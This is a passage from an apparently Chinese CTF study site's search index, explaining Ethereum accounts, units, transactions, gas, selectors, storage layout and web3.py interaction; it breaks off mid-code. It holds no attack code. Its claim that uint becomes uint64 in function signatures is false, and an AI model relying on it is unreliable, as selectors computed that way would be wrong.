<li>storageRoot\uff1a\u5b58\u50a8\u533a\u7684\u54c8\u5e0c\u503c\uff0c\u6307\u5411\u5408\u7ea6\u8d26\u6237\u7684\u5b58\u50a8\u6570\u636e\u533a</li> <li>codeHash\uff1a\u4ee3\u7801\u533a\u7684\u54c8\u5e0c\u503c\uff0c\u6307\u5411\u5408\u7ea6\u8d26\u6237\u5b58\u50a8\u7684\u667a\u80fd\u5408\u7ea6\u4ee3\u7801</li> </ul>"},{"location":"ctf/blockchain/eth/basic/#_4","title":"\u4ee5\u592a\u5e01\u5355\u4f4d","text":"<p>\u4ee5\u592a\u5e01\u7684\u6700\u5c0f\u5355\u4f4d\u662f wei\uff0c\u5176\u662f\u4e00\u4e2a\u5f88\u5c0f\u7684\u5355\u4f4d\uff0c\u4e00\u4e9b\u5176\u4ed6\u5355\u4f4d\uff1a</p> <ul> <li>1 Kwei (1 Babbage) = \\(10^3\\) wei</li> <li>1 Mwei (1 Lovelace) = \\(10^6\\) wei</li> <li>1 Gwei (1 Shannon) = \\(10^9\\) wei</li> <li>1 Szabo (1 microether) = \\(10^{12}\\) wei</li> <li>1 Finney (1 milliether) = \\(10^{15}\\) wei</li> <li>1 Ether = \\(10^{18}\\) wei</li> </ul> <p>\u5355\u4f4d\u6362\u7b97\uff1aEthereum Unit Converter</p>"},{"location":"ctf/blockchain/eth/basic/#_5","title":"\u4ea4\u6613","text":"<p>\u4ee5\u592a\u574a\u4e2d\u7684\u4ea4\u6613\uff08Transaction\uff09\u6307\u7684\u662f\u4ece\u4e00\u6761\u8d26\u6237\u53d1\u9001\u5230\u53e6\u4e00\u6761\u8d26\u6237\u7684\u6d88\u606f\u7684\u7b7e\u540d\u6570\u636e\u5305\uff0c\u65e0\u8bba\u662f\u8f6c\u8d26\u8fd8\u662f\u521b\u5efa\u667a\u80fd\u5408\u7ea6\u3001\u8c03\u7528\u667a\u80fd\u5408\u7ea6\u90fd\u662f\u901a\u8fc7\u4ea4\u6613\u8fdb\u884c\u7684\u3002\u6bcf\u4e00\u7b14\u4ea4\u6613\u4e5f\u4f1a\u652f\u4ed8\u4e00\u5b9a\u7684\u624b\u7eed\u8d39\u3002</p>"},{"location":"ctf/blockchain/eth/basic/#_6","title":"\u4ea4\u6613\u5185\u5bb9","text":"<p>\u4e00\u6761\u4ea4\u6613\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9\uff1a</p> <ul> <li>from\uff1a\u4ea4\u6613\u53d1\u9001\u8005\u5730\u5740</li> <li>to\uff1a\u4ea4\u6613\u63a5\u6536\u8005\u5730\u5740\uff0c\u5982\u679c\u4e3a\u7a7a\u5219\u8868\u793a\u662f\u5728\u521b\u5efa\u667a\u80fd\u5408\u7ea6</li> <li>value\uff1a\u4ea4\u6613\u91d1\u989d\uff0c\u5373\u53d1\u9001\u65b9\u8981\u7ed9\u63a5\u6536\u65b9\u8f6c\u79fb\u7684\u4ee5\u592a\u5e01\u6570\u91cf\uff08wei \u4e3a\u5355\u4f4d\uff09</li> <li>data\uff1a\u4ea4\u6613\u6570\u636e\uff0c\u5982\u679c\u662f\u521b\u5efa\u667a\u80fd\u5408\u7ea6\u5219\u662f\u667a\u80fd\u5408\u7ea6\u4ee3\u7801\uff0c\u5982\u679c\u662f\u8c03\u7528\u667a\u80fd\u5408\u7ea6\u5219\u662f\u8c03\u7528\u7684\u51fd\u6570\u540d\u548c\u53c2\u6570</li> <li>gasPrice\uff1a\u4ea4\u6613\u7684 gas \u4ef7\u683c\uff0c\u5373\u6bcf\u5355\u4f4d gas \u7684\u4ef7\u683c\uff08wei \u4e3a\u5355\u4f4d\uff09</li> <li>gasLimit\uff1a\u4ea4\u6613\u7684 gas \u4e0a\u9650\uff0c\u5373\u4ea4\u6613\u5141\u8bb8\u6267\u884c\u7684\u6700\u5927 gas \u6570\u91cf</li> <li>nonce\uff1a\u4ea4\u6613\u7684\u5e8f\u53f7\uff0c\u5373\u53d1\u9001\u8005\u5df2\u7ecf\u53d1\u9001\u7684\u4ea4\u6613\u6570\u91cf</li> </ul> <p>\u9664\u6b64\u4e4b\u5916\u53d1\u9001\u7684\u4ea4\u6613\u6570\u636e\u5305\u8fd8\u9700\u8981\u5305\u542b\uff1a</p> <ul> <li>hash\uff1a\u4ea4\u6613\u7684\u54c8\u5e0c\u503c\uff0c\u7531\u524d\u9762\u7684\u5185\u5bb9\u548c chainId \u8ba1\u7b97\u5f97\u5230</li> <li>v\u3001r\u3001s\uff1a\u4ea4\u6613\u7b7e\u540d\u7684\u4e09\u4e2a\u90e8\u5206\uff0c\u7531\u53d1\u9001\u8005\u79c1\u94a5\u5bf9\u4ea4\u6613\u54c8\u5e0c\u503c\u8fdb\u884c\u7b7e\u540d\u5f97\u5230</li> </ul>"},{"location":"ctf/blockchain/eth/basic/#_7","title":"\u4e09\u79cd\u4ea4\u6613","text":"<p>\u4ee5\u592a\u574a\u7684\u4ea4\u6613\u53ef\u4ee5\u5206\u4e3a\u4e09\u79cd\u573a\u666f\uff1a</p> <ul> <li>\u8f6c\u8d26\u4ea4\u6613\uff1a\u4ece\u4e00\u4e2a\u8d26\u6237\u5411\u53e6\u4e00\u4e2a\u8d26\u6237\u53d1\u9001\u4ee5\u592a\u5e01<ul> <li>\u5fc5\u987b\u8981\u6307\u5b9a from\u3001to\u3001value\uff0c\u5206\u522b\u8868\u793a\u53d1\u9001\u8005\u3001\u63a5\u6536\u8005\u3001\u8f6c\u79fb\u7684\u4ee5\u592a\u5e01\u6570\u91cf\uff08\u5176\u5b83\u5b57\u6bb5\u6709\u9ed8\u8ba4\u503c\uff09</li> <li>\u4ea4\u6613\u6570\u636e\u5305\u4e2d\u7684 data \u4e3a\u7a7a</li> <li>\u63a5\u6536\u65b9\u53ef\u4ee5\u662f EOA \u4e5f\u53ef\u4ee5\u662f\u5408\u7ea6\u8d26\u6237</li> </ul> </li> <li>\u521b\u5efa\u5408\u7ea6\u4ea4\u6613\uff1a\u521b\u5efa\u4e00\u4e2a\u5408\u7ea6\u8d26\u6237\uff08\u5c06\u5408\u7ea6\u90e8\u7f72\u5230\u94fe\u4e0a\uff09<ul> <li>\u5fc5\u987b\u8981\u6307\u5b9a from\u3001data\uff0c\u5206\u522b\u8868\u793a\u53d1\u9001\u8005\u3001\u5408\u7ea6\u4ee3\u7801\uff08\u7f16\u8bd1\u540e\u7684\u5b57\u8282\u7801\uff09</li> <li>\u4ea4\u6613\u6570\u636e\u5305\u4e2d\u7684 to \u4e3a\u7a7a</li> </ul> </li> <li>\u8c03\u7528\u5408\u7ea6\u4ea4\u6613\uff1a\u8c03\u7528\u4e00\u4e2a\u5408\u7ea6\u8d26\u6237\u7684\u51fd\u6570<ul> <li>\u5fc5\u987b\u8981\u6307\u5b9a from\u3001to\u3001data\uff0c\u5206\u522b\u8868\u793a\u53d1\u9001\u8005\u3001\u63a5\u6536\u8005\u3001\u8c03\u7528\u7684\u4fe1\u606f</li> <li>data \u5b57\u6bb5\u662f\u7f16\u7801\u540e\u7684\u51fd\u6570\u540d\uff08\u9009\u62e9\u5b50\uff09\u548c\u53c2\u6570</li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/basic/#_8","title":"\u4ea4\u6613\u624b\u7eed\u8d39","text":"<p>\u6bcf\u7b14\u4ea4\u6613\u90fd\u9700\u8981\u652f\u4ed8\u4e00\u5b9a\u7684\u624b\u7eed\u8d39\uff0c\u6765\u8865\u507f\u6267\u884c\u65f6\u7684\u8ba1\u7b97\u5f00\u9500\uff0c\u540c\u65f6\u4e5f\u4f1a\u652f\u4ed8\u7ed9\u77ff\u5de5\u4f5c\u4e3a\u6253\u5305\u4ea4\u6613\u7684\u5956\u52b1\u3002</p> <p>\u624b\u7eed\u8d39\u4e0d\u662f\u7531\u4ee5\u592a\u5e01\u76f4\u63a5\u8ba1\u7b97\u7684\uff0c\u800c\u662f\u901a\u8fc7 gas \u6765\u4f5c\u4e3a\u5355\u4f4d\uff0c\u901a\u8fc7 gasPrice \u4e0e\u4ee5\u592a\u5e01\u8fdb\u884c\u6362\u7b97\u3002</p> <p>gasPrice \u662f\u4e00\u5355\u4f4d gas \u5bf9\u5e94\u7684\u4ee5\u592a\u5e01\u4ef7\u503c\uff08wei \u4e3a\u5355\u4f4d\uff09\uff0cgasLimit \u662f\u4ea4\u6613\u53d1\u9001\u8005\u613f\u610f\u4e3a\u8fd9\u7b14\u4ea4\u6613\u652f\u4ed8\u7684\u6700\u5927 gas \u6570\u91cf\u3002\u5728\u4ea4\u6613\u6267\u884c\u65f6\uff0c\u4f1a\u6d88\u8017 gas\uff0c\u5982\u679c\u6d88\u8017\u7684 gas \u6570\u91cf\u5c0f\u4e8e gasLimit\uff0c\u5219\u4ea4\u6613\u6210\u529f\u6267\u884c\uff0c\u77ff\u5de5\u4f1a\u6536\u53d6\u5b9e\u9645\u6d88\u8017\u7684 gas * gasPrice \u7684\u624b\u7eed\u8d39\uff1b\u5982\u679c\u6267\u884c\u8fc7\u7a0b\u4e2d\u6d88\u8017\u7684 gas \u8d85\u8fc7\u4e86 gasLimit\uff0c\u5219\u4ea4\u6613\u5931\u8d25\uff0c\u4f1a\u56de\u6eda\uff08revert\uff09\u5230\u4ea4\u6613\u6267\u884c\u524d\u7684\u72b6\u6001\uff0c\u540c\u65f6\u77ff\u5de5\u4f1a\u6536\u53d6 gasLimit * gasPrice \u7684\u624b\u7eed\u8d39\u3002</p>"},{"location":"ctf/blockchain/eth/basic/#_9","title":"\u5408\u7ea6","text":"<p>\u5408\u7ea6\u8d26\u6237\u548c\u521b\u5efa\u5408\u7ea6\u3001\u8c03\u7528\u5408\u7ea6\u7684\u4ea4\u6613\u5728\u524d\u9762\u5df2\u7ecf\u8bf4\u8fc7\u4e86\u3002\u4e0b\u9762\u662f\u4e00\u4e9b\u5173\u4e8e\u5408\u7ea6\u7684\u5b9e\u73b0\u3001\u539f\u7406\u7b49\u5185\u5bb9\u3002</p>"},{"location":"ctf/blockchain/eth/basic/#_10","title":"\u7f16\u5199\u5408\u7ea6","text":"<p>\u5408\u7ea6\u4e00\u822c\u662f\u4f7f\u7528 Solidity \u8bed\u8a00\u8fdb\u884c\u7f16\u5199\u7684\uff0c\u9664\u6b64\u4e4b\u5916\u4e5f\u6709 Yul \u7b49\u8bed\u8a00\u3002\u5173\u4e8e Solidity \u7684\u8bed\u6cd5\u5c31\u4e0d\u5728\u8fd9\u91cc\u5199\u4e86\u3002</p> <p>\u5408\u7ea6\u7f16\u5199\u540e\u9700\u8981\u901a\u8fc7\u7f16\u8bd1\u5668\u7f16\u8bd1\u6210 EVM \u53ef\u6267\u884c\u7684\u5b57\u8282\u7801\u3002\u76f8\u5173\u5b57\u8282\u7801\u5728\u53e6\u5916\u7684\u7ae0\u8282\u6765\u5199\uff08TODO\uff09</p> <p>\u603b\u4e4b\u53ef\u4ee5\u4f7f\u7528 Remix IDE \u6765\u8fdb\u884c\u5408\u7ea6\u7684\u7f16\u5199\u3001\u7f16\u8bd1\u3001\u90e8\u7f72\u3001\u8c03\u8bd5\u7b49\u64cd\u4f5c\u3002</p>"},{"location":"ctf/blockchain/eth/basic/#_11","title":"\u5408\u7ea6\u7684\u521b\u5efa","text":"<p>\u524d\u9762\u8bf4\u5230\u4e86\u5408\u7ea6\u8981\u901a\u8fc7\u4ea4\u6613\u6765\u8fdb\u884c\u521b\u5efa\uff0c\u8fd9\u4e2a\u4ea4\u6613\u7684 to \u5b57\u6bb5\u5e94\u8be5\u4e3a\u7a7a\uff0c\u4e14 data \u5b57\u6bb5\u4e3a\u7f16\u8bd1\u540e\u7684\u5408\u7ea6\u5b57\u8282\u7801\u3002</p> <p>\u5728\u6267\u884c\u4ea4\u6613\u65f6\uff0c\u8fd9\u4e2a data \u5b57\u6bb5\u7684\u5185\u5bb9\u4f1a\u88ab\u653e\u5728 EVM \u4e0a\u6267\u884c\uff0c\u5b83\u53ef\u4ee5\u662f\u4efb\u610f\u53ef\u6267\u884c\u7684\u5b57\u8282\u7801\uff0c\u9047\u5230 return \u6307\u4ee4\u76f4\u63a5\u8fd4\u56de\uff0c\u4e5f\u53ef\u4ee5\u8fd4\u56de\u7ed3\u679c\uff08\u4e14\u6709\u56de\u663e\uff09\u3002</p> <p>\u4e00\u822c\u7684\u5408\u7ea6\u5b57\u8282\u7801\u4f1a\u5206\u4e3a\u4e24\u4e2a\u90e8\u5206\uff0c\u5373 creationCode \u548c runtimeCode\u3002\u5b83\u4eec\u662f\u62fc\u63a5\u5728\u4e00\u8d77\u7684\u4e00\u4e2a\u6574\u4f53\u3002\u5728 EVM \u8fd0\u884c\u5b57\u8282\u7801\u65f6\uff0c\u5148\u6267\u884c creationCode \u90e8\u5206\uff0c\u5176\u4f5c\u7528\u662f\u8fd0\u884c\u6784\u5efa\u51fd\u6570\u3001\u8bbe\u7f6e\u5408\u7ea6\u521d\u59cb\u72b6\u6001\uff0c\u7136\u540e\u8fd4\u56de runtimeCode\uff0c\u8fd9\u4e2a\u5c06\u4f1a\u88ab\u90e8\u7f72\u5230\u94fe\u4e0a\u4ee3\u7801\u533a\u3002\u4e4b\u540e\u5728\u94fe\u4e0a\u5b58\u50a8\u7684\u5c31\u53ea\u662f runtimeCode \u90e8\u5206\uff0c\u4e5f\u662f\u8c03\u7528\u65f6\u4f1a\u6267\u884c\u7684\u5b9e\u9645\u90e8\u5206\u3002</p> <p>\u5982\u679c\u5408\u7ea6\u7684\u6784\u5efa\u51fd\u6570\u662f payable \u7684\uff0c\u90a3\u4e48\u53ef\u4ee5\u5728\u521b\u5efa\u4ea4\u6613\u7684\u65f6\u5019\u901a\u8fc7 value \u5b57\u6bb5\u6765\u9644\u5e26\u4ee5\u592a\u5e01\uff0c\u8fd9\u4e9b\u4ee5\u592a\u5e01\u4f1a\u88ab\u8f6c\u79fb\u5230\u5408\u7ea6\u8d26\u6237\u4e2d\u3002\u5982\u679c\u4e0d\u662f payable \u4f46\u521b\u5efa\u65f6\u5411\u5176\u8f6c\u8d26\u4e86\uff0c\u90a3\u4e48\u8fd9\u6761\u4ea4\u6613\u4f1a revert\u3002</p>"},{"location":"ctf/blockchain/eth/basic/#_12","title":"\u5408\u7ea6\u7684\u8c03\u7528","text":"<p>\u5408\u7ea6\u7684\u8c03\u7528\u4e5f\u662f\u901a\u8fc7\u4ea4\u6613\u6765\u8fdb\u884c\u7684\uff0c\u8fd9\u4e2a\u4ea4\u6613\u7684 to \u5b57\u6bb5\u5e94\u8be5\u4e3a\u5408\u7ea6\u8d26\u6237\u5730\u5740\uff0cdata \u5b57\u6bb5\u4e3a\u7f16\u7801\u540e\u7684\u51fd\u6570\u540d\u548c\u53c2\u6570\uff0c\u79f0\u4e3a calldata\u3002</p> <p>calldata \u5206\u4e3a\u4e24\u4e2a\u90e8\u5206\uff0c\u5f00\u5934\u56db\u4e2a\u5b57\u8282\u4f1a\u8868\u660e\u8981\u8c03\u7528\u7684\u51fd\u6570\uff0c\u4e5f\u88ab\u79f0\u4e3a function selector\uff1b\u540e\u9762\u7684\u90e8\u5206\u662f\u51fd\u6570\u7684\u53c2\u6570\u3002</p>"},{"location":"ctf/blockchain/eth/basic/#selector","title":"Selector","text":"<p>Selector \u662f\u51fd\u6570\u7b7e\u540d\u7684 keccak256 \u54c8\u5e0c\u503c\u7684\u524d\u56db\u4e2a\u5b57\u8282\u3002</p> <p>\u5176\u4e2d\u51fd\u6570\u7b7e\u540d\uff1a</p> <ul> <li>\u57fa\u7840\u539f\u578b\u662f\u7531\u51fd\u6570\u540d\u79f0\u52a0\u4e0a\u62ec\u53f7\u62ec\u8d77\u6765\u7684\u53c2\u6570\u7c7b\u578b\u5217\u8868\uff0c\u53c2\u6570\u7c7b\u578b\u4e4b\u95f4\u7528\u9017\u53f7\u5206\u9694\u4e14\u65e0\u7a7a\u683c</li> <li>\u5bf9\u4e8e uint \u7c7b\u578b\u8981\u8f6c\u6210 uint64</li> <li>\u5bf9\u4e8e\u7ed3\u6784\u4f53\uff0c\u4f1a\u5c06\u5176\u6210\u5458\u7c7b\u578b\u5c55\u5f00\u5e76\u7528\u62ec\u53f7\u62ec\u8d77\u6765</li> </ul> <p>\u5728\u8fdb\u884c\u4e00\u4e2a\u8c03\u7528\u7684\u65f6\u5019\uff0c\u4f1a\u5148\u5c06 data \u4e2d\u7684 selector \u4e0e\u5408\u7ea6\u4e2d\u7684\u51fd\u6570\u7b7e\u540d\u8fdb\u884c\u6bd4\u5bf9\uff1a</p> <ul> <li>\u5982\u679c\u5b58\u5728\u76f8\u540c\u7684\u51fd\u6570\u7b7e\u540d\uff0c\u90a3\u4e48\u5c31\u4f1a\u8c03\u7528\u8fd9\u4e2a\u51fd\u6570</li> <li>\u5982\u679c\u4e0d\u5b58\u5728\uff1a<ul> <li>\u5982\u679c\u5b58\u5728 fallback \u51fd\u6570\uff0c\u90a3\u4e48\u5c31\u4f1a\u8c03\u7528 fallback \u51fd\u6570</li> <li>\u5426\u5219 revert</li> </ul> </li> </ul> <p>\u76f8\u5e94\u7684\u903b\u8f91\u662f\u5728\u5408\u7ea6\u7f16\u8bd1\u7684\u65f6\u5019\u5199\u5728 runtimeCode \u91cc\u7684\uff0c\u5176\u5927\u81f4\u903b\u8f91\u662f\uff1a <pre><code>if (msg.value) { revert(); } // \u5982\u679c\u4e0d\u662f payable \u7684\u8bdd\u4f1a\u6709\u8fd9\u53e5\nif (msg.data.length == 0) { fallback(); } // \u5982\u679c\u6ca1\u6709 fallback \u5c31 revert\nif (msg.data[0:4] == selector1) {\n    function1();\n} else if (msg.data[0:4] == selector2) {\n    function2();\n} else {\n    fallback(); // \u5982\u679c\u6709 fallback\n    // revert(); // \u5982\u679c\u6ca1\u6709 fallback\n}\n</code></pre></p>"},{"location":"ctf/blockchain/eth/basic/#_13","title":"\u5408\u7ea6\u4e2d\u83b7\u53d6\u6570\u636e","text":"<p>Solidity \u4e2d\u6709\u4e00\u4e9b\u5168\u5c40\u53d8\u91cf\u53ef\u4ee5\u7528\u6765\u83b7\u53d6\u533a\u5757\u4fe1\u606f\u3001\u4ea4\u6613\u4fe1\u606f\u7b49\uff1a</p> <ul> <li>block.chainid\u3001block.coinbase\u3001block.number\u3001block.timestamp\u2026\u2026</li> <li>msg.data\uff1a\u5b8c\u6574\u7684 calldata</li> <li>msg.sender\uff1a\u5f53\u524d\u8c03\u7528\u8005\u7684\u5730\u5740</li> <li>msg.sig\uff1aselector\uff0c\u4e5f\u5c31\u662f calldata \u7684\u524d\u56db\u4e2a\u5b57\u8282</li> <li>msg.value\uff1a\u4ea4\u6613\u4e2d\u9644\u5e26\u7684\u4ee5\u592a\u5e01\u6570\u91cf\uff08wei\uff09</li> <li>tx.gasprice\uff1a\u4ea4\u6613\u7684 gasprice</li> <li>tx.origin\uff1a\u4ea4\u6613\u7684\u53d1\u8d77\u8005\uff08\u6574\u6761\u8c03\u7528\u94fe\u6700\u5f00\u5934\u7684\u8d26\u6237\uff09</li> </ul>"},{"location":"ctf/blockchain/eth/basic/#_14","title":"\u5b58\u50a8","text":"<p>\u4ee5\u592a\u574a\u4f1a\u4e3a\u5408\u7ea6\u63d0\u4f9b\u4e00\u4e2a\u5b58\u50a8\u7a7a\u95f4\uff0c\u5176\u5b58\u50a8\u76f8\u5f53\u4e8e\u4e00\u4e2a \\(2^{256}\\) \u5927\u5c0f\u7684\u6570\u7ec4\uff0c\u6570\u7ec4\u4e2d\u6bcf\u4e2a\u5143\u7d20\u79f0\u4e3a\u63d2\u69fd\uff08slot\uff09\uff0c\u6bcf\u4e2a\u63d2\u69fd\u7684\u5927\u5c0f\u662f 256 \u4f4d\uff0c\u4e5f\u5c31\u662f 32 \u5b57\u8282\u3002\u6574\u4f53\u5bb9\u91cf\u975e\u5e38\u5de8\u5927\uff0c\u4f46\u5b58\u50a8\u662f\u7a00\u758f\u7684\uff0c\u5373\u53ea\u4f1a\u5b58\u50a8\u6709\u503c\u7684\u63d2\u69fd\u3002</p> <p>Solidity \u89c4\u5b9a\u4e86\u5408\u7ea6\u5185\u53d8\u91cf\u7684\u5b58\u50a8\u65b9\u5f0f\uff0c\u5927\u81f4\u662f\uff1a</p> <ul> <li>\u5355\u4e2a\u503c\u7c7b\u578b<ul> <li>\u4ee5\u4f4e\u4f4d\u5bf9\u9f50\uff08\u53f3\u5bf9\u9f50\uff09\u7684\u65b9\u5f0f\u5b58\u50a8\u5728\u4e00\u4e2a\u63d2\u69fd\u4e2d</li> <li>\u4e00\u4e2a\u57fa\u672c\u7c7b\u578b\u53ea\u4f1a\u5360\u636e\u5b83\u6240\u9700\u7684\u7a7a\u95f4\uff0c\u6bd4\u5982 uint8 \u53ea\u4f1a\u5360\u7528 1 \u5b57\u8282</li> <li>\u5982\u679c\u5f53\u524d\u63d2\u69fd\u8fd8\u53ef\u4ee5\u5bb9\u7eb3\u4e0b\u4e00\u4e2a\u503c\uff0c\u5219\u4e0b\u4e00\u4e2a\u503c\u7ee7\u7eed\u5728\u5f53\u524d\u63d2\u69fd\u5b58\u50a8\uff08\u5728\u5f53\u524d\u503c\u201c\u5de6\u8fb9\u201d\uff09</li> <li>\u5982\u679c\u5f53\u524d\u63d2\u69fd\u5bb9\u7eb3\u4e0d\u4e0b\u4e0b\u4e00\u4e2a\u503c\uff0c\u5219\u4e0b\u4e00\u4e2a\u503c\u4f1a\u5b58\u50a8\u5728\u4e0b\u4e00\u4e2a\u63d2\u69fd\u4e2d</li> <li>\u5bf9\u4e8e\u7ed3\u6784\u4f53\uff0c\u5b58\u50a8\u65f6\u4e00\u5b9a\u4f1a\u65b0\u5f00\u4e00\u4e2a\u63d2\u69fd\uff0c\u5176\u5185\u90e8\u5b58\u50a8\u4ecd\u7136\u6309\u7167\u4e0a\u9762\u7684\u89c4\u5219</li> <li>\u4f8b\u5982\u5982\u4e0b\u5408\u7ea6\u7684\u5b58\u50a8\uff1a     <pre><code>contract C {\n    address a;\n    uint8 b;\n    uint256 c;\n    bytes24 d;\n}\n\n// -----------------------------------------------------\n// | unused (11) | b (1) |            a (20)           | &lt;- slot 0\n// -----------------------------------------------------\n// |                       c (32)                      | &lt;- slot 1\n// -----------------------------------------------------\n// | unused (8) |                d (24)                | &lt;- slot 2\n// -----------------------------------------------------\n</code></pre></li> </ul> </li> <li>\u6620\u5c04<ul> <li>\u5373 solidity \u4e2d\u7684 mapping</li> <li>\u4f8b\u5982 mapping(address =&gt; uint256) a<ul> <li>\u4f1a\u5148\u5728\u5982\u4e0a\u987a\u5e8f\u5b58\u50a8\u4e2d\u5360\u636e\u4e00\u6574\u4e2a\u63d2\u69fd\uff08slot p\uff09</li> <li>\u6620\u5c04\u4e2d\u952e addr \u5bf9\u5e94\u7684\u503c\u4f1a\u5b58\u5728 keccak256(addr . p) \u7684\u63d2\u69fd\u4e2d\uff08. \u8868\u793a\u8fde\u63a5\uff09</li> </ul> </li> </ul> </li> <li>\u52a8\u6001\u6570\u7ec4<ul> <li>\u540c\u6837\u5728\u987a\u5e8f\u5b58\u50a8\u4e2d\u5360\u636e\u4e00\u6574\u4e2a\u63d2\u69fd slot p\uff0c\u5176\u5185\u5bb9\u662f\u8be5\u52a8\u6001\u6570\u7ec4\u73b0\u5728\u7684\u957f\u5ea6</li> <li>\u6570\u7ec4\u5185\u5bb9\u5b58\u50a8\u7684\u5f00\u5934\u662f slot keccak(p)</li> </ul> </li> <li>\u5b57\u8282\u6570\u7ec4\u548c\u5b57\u7b26\u4e32<ul> <li>\u5982\u679c\u957f\u5ea6\u5c0f\u4e8e 32 \u5b57\u8282<ul> <li>\u548c\u5355\u4e2a\u503c\u7c7b\u578b\u4e00\u6837\uff0c\u5b58\u50a8\u5728\u4e00\u4e2a\u63d2\u69fd\u4e2d\uff0c\u9ad8\u4f4d\u5bf9\u9f50\uff08\u5de6\u5bf9\u9f50\uff09</li> <li>\u8be5\u63d2\u69fd\u6700\u4f4e\u4f4d\u4f1a\u5b58\u50a8 length * 2</li> </ul> </li> <li>\u5982\u679c\u957f\u5ea6\u8d85\u8fc7\u4e86 31 \u5b57\u8282<ul> <li>\u5f53\u524d\u5360\u636e\u4e00\u6574\u4e2a\u63d2\u69fd\uff08slot p\uff09\u5b58\u50a8 length * 2 + 1</li> <li>\u6570\u7ec4\u5185\u5bb9\u5b9e\u9645\u5b58\u50a8\u7684\u5f00\u5934\u662f slot keccak(p)</li> </ul> </li> </ul> </li> </ul> <p>\u4ee5\u592a\u574a\u4e0a\u7684\u8fd9\u4e9b\u5b58\u50a8\u90fd\u662f\u516c\u5f00\u7684\uff0c\u5373\u4f7f\u5728 Solidity \u4e2d\u89c4\u5b9a\u4e86\u662f private \u53d8\u91cf\uff0c\u4e5f\u4e0d\u4f1a\u5728\u5b58\u50a8\u4e2d\u9690\u85cf\u3002\u8fd9\u4e9b\u5b58\u50a8\u53ef\u4ee5\u901a\u8fc7 rpc \u7684 eth_getStorageAt \u63a5\u53e3\u6765\u8bfb\u53d6\uff0c\u5373 getStorageAt(address, slot)\u3002</p>"},{"location":"ctf/blockchain/eth/basic/#_15","title":"\u4ea4\u4e92","text":"<p>\u5728 geth\uff08Go Ethereum\uff09\u5b9e\u73b0\u7684\u4ee5\u592a\u574a\u534f\u8bae\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7 rpc\uff08remote process call\uff0c\u8fdc\u7a0b\u8fc7\u7a0b\u8c03\u7528\uff09\u7684\u65b9\u5f0f\u6765\u548c\u4ee5\u592a\u574a\u7f51\u7edc\u8fdb\u884c\u4ea4\u4e92\u3002</p>"},{"location":"ctf/blockchain/eth/basic/#geth","title":"geth","text":"<p>geth \u662f\u4ee5\u592a\u574a\u5b98\u65b9\u63d0\u4f9b\u7684\u4e00\u4e2a\u5b9e\u73b0\u4e86\u4ee5\u592a\u574a\u534f\u8bae\u7684\u5ba2\u6237\u7aef\uff0c\u662f\u4ee5\u592a\u574a\u7f51\u7edc\u7684\u4e00\u4e2a\u5165\u53e3\u70b9\u3002geth \u7684 rpc \u63a5\u53e3\u53ef\u4ee5\u901a\u8fc7 http \u6216\u8005 websocket \u6765\u8bbf\u95ee\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 ipc \u6765\u8bbf\u95ee\u3002</p> <p>\u53ef\u4ee5\u901a\u8fc7 geth \u6765\u521b\u5efa\u8282\u70b9\uff0c\u4e5f\u53ef\u4ee5\u8fde\u63a5\u5230\u5df2\u6709\u7684\u4ee5\u592a\u574a\u7f51\u7edc\u3001\u6d4b\u8bd5\u7f51\u7edc\u3001\u79c1\u6709\u7f51\u7edc\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 geth \u6765\u642d\u5efa\u79c1\u94fe\u3002</p> <p>\u4e00\u822c\u5bf9\u4e8e CTF \u9898\u76ee\u6765\u8bf4\u4f1a\u6709\u4e00\u4e2a\u5df2\u7ecf\u642d\u597d\u7684\u79c1\u94fe\uff0c\u7136\u540e\u7ed9\u51fa\u4e00\u4e2a rpc \u63a5\u53e3\uff0c\u53ef\u4ee5\u901a\u8fc7 geth attach \u7684\u65b9\u5f0f\u8fde\u63a5\u7136\u540e\u6267\u884c\u547d\u4ee4\u3002\u5177\u4f53\u7684\u547d\u4ee4\u7528\u6cd5\u5c31\u4e0d\u5199\u4e86\u3002</p> <p>\u4e00\u822c\u7684 CTF \u9898\u76ee\u4f1a\u4f7f\u7528  chainflag/eth-challenge-base \u6765\u642d\u5efa\u73af\u5883\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u79c1\u94fe\u3001\u9632\u706b\u5899\u3001\u6c34\u7ba1\uff08faucet\uff0c\u7528\u4e8e\u53d1\u653e eth\uff09\u4ee5\u53ca\u9898\u76ee\u63a5\u53e3\u3002\u8fd9\u4e2a\u9632\u706b\u5899\u4e3a\u4e86\u9632\u6b62\u722c\u94fe\u627e\u522b\u4eba\u7684\u4ea4\u6613\u4f1a\u53ea\u4fdd\u7559\u51e0\u4e2a rpc \u65b9\u6cd5\uff0c\u901a\u8fc7 geth \u6765\u6267\u884c\u8fd9\u4e9b\u547d\u4ee4\u90e8\u7f72\u5408\u7ea6\u3001\u53d1\u9001\u4ea4\u6613\u662f\u6bd4\u8f83\u4e0d\u65b9\u4fbf\u7684\uff0c\u6240\u4ee5\u4e00\u822c\u4f7f\u7528 web3.js / web3.py \u6765\u8fdb\u884c\u4ea4\u4e92\u3002</p>"},{"location":"ctf/blockchain/eth/basic/#web3py","title":"web3.py","text":"<p>web3.py \u662f\u4e00\u4e2a python \u7684\u4ee5\u592a\u574a rpc \u5ba2\u6237\u7aef\u3002\u7531\u4e8e challenge base \u7684\u9632\u706b\u5899\u53ea\u7559\u4e0b\u4e86\u6781\u5c11\u65b9\u6cd5\uff0c\u6240\u4ee5\u53d1\u9001\u4ea4\u6613\u65f6\u8981\u5148 sighTransaction \u624b\u52a8\u7b7e\u7f72\uff0c\u7136\u540e sendRawTransaction \u53d1\u9001\u4ea4\u6613\u6570\u636e\u3002</p> <p>\u5e38\u7528\u4ea4\u4e92\u4ee3\u7801\uff1a <pre><code>from web3 import Web3\n# from rich import print\n\nw3 = Web3(Web3.HTTPProvider('...'))\n\nhacker = '...'\ntarget = '...'\nprivateKey = '...'\n\ndef get_txn(src, dst, data, value=0, gas=0x200000):\n    return {\n        \"chainId\": w3.eth.chainId,\n        \"from\": src,\n        \"to\": dst,\n        \"gasPrice\": w3.toWei(1.1, 'gwei'),\n        \"gas\": gas,\n        \"value\": w3.toWei(value, 'ether'),\n        \"nonce\": w3.eth.getTransactionCount(src),\n        \"data\": data\n    }\n\ndef transact(src, dst, data, value=0, gas=0x200000):\n    data = get_txn(src, dst, data, value, gas)\n    transaction = w3.eth.account.signTransaction(data, privateKey).rawTransaction\n    txn_hash = 